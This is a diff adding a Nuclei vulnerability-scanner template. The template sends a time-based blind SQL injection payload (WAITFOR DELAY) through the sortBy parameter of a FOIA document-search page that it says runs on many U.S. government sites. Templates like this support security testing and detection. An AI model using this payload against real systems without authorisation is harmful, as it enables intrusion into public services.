@@ -1,0 +1,31 @@
+id: blind-sqli-FOIA-library
+
+info:
+  name: Blind SQLi - FOIA Library
+  author: Al-Muntadhar
+  severity: critical
+  description: |
+    Most of the U.S. Gov sites uses the FOIA library, which is vulnerable to SQLi via the sortBy parameter.
+  tags: sqli, blind, time-based, asp.net
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app/SearchDocs.aspx?doctypes=19&filename=*&sdate=&edate=&content=&sortBy=1%20WAITFOR%20DELAY%20%270:0:20%27--%20udTV&sortOrder=&custom={%22customFields%22:[]}"
+
+    headers:
+      User-Agent: "sql-gremlin-nuclei"
+
+    matchers:
+      - type: dsl
+        name: delayed-response
+        dsl:
+          - "duration>=19"
+          - "status_code==200"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: extract-delay
+        regex:
+          - "(?i).*"
